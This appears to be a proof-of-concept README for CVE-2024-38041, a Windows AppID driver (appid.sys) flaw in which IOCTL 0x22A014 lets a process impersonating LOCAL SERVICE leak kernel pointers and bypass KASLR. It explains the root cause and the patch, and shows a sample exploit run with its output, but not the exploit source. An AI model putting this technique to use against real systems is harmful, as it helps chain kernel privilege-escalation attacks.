# CVE-2024-38041

**Title:** Windows Kernel Information Disclosure Vulnerability  
**CVE-2024-38041:** https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38041  
**Vulnerability Type:** Exposure of Sensitive Information to an Unauthorized Actor  
**Tested On:** appid.sys - 10.0.22621.3155    

## Description

CVE-2024-38041 is a information leak vulnerability in the Windows AppID driver (`appid.sys`). The flaw lies in the handler for IOCTL code `0x22A014`, which lacks proper validation of the caller's access mode. Specifically, the `AipDeviceIoControlDispatch` function does not verify that the request originates from kernel mode. As a result, a user-mode process running as LOCAL SERVICE can trigger this IOCTL to leak kernel pointers via a shared SystemBuffer. In the patched version, a call to `ExGetPreviousMode()` ensures only kernel-mode callers can proceed, blocking this path. By impersonating the LOCAL SERVICE account and invoking the vulnerable IOCTL, an attacker can leak kernel addresses, bypassing KASLR and paving the way for further kernel exploitation.

## Exploit

Tested on: Windows 11 22H2 (01-2024 Build)

```
PS C:\Users\h4x\Desktop> .\CVE-2024-38041.exe -p 1544
[+] Trying to find Thread ID for the given process PID: 1544
[+] First Thread ID of the process: 1548
[+] Opened a THREAD_DIRECT_IMPERSONATION handle to the LOCAL_SERVICE process
[+] Opening handle to Applocker device
[+] Calling AipDeviceIoControlDispatch ....success
[+] Leaked Kernel Address:
        [*] Value0: 0xFFFFF80180C96820
        [*] Value1: 0xFFFFF80180C96888
        [*] Value2: 0xFFFFF80180C96890
        [*] Value3: 0xFFFFF80180C96898
        [*] Value4: 0xFFFFF80180C9D250
        [*] Value5: 0xFFFFF80180C9C570
```

## Acknowledgements

- It was explained by CSACyber and can be found [here](https://csacyber.com/blog/exploiting-microsoft-kernel-applocker-driver-cve-2024-38041).
- The [PoC](https://github.com/varwara/CVE-2024-38041/) was developed by Varwara, and the above PoC is based on it.
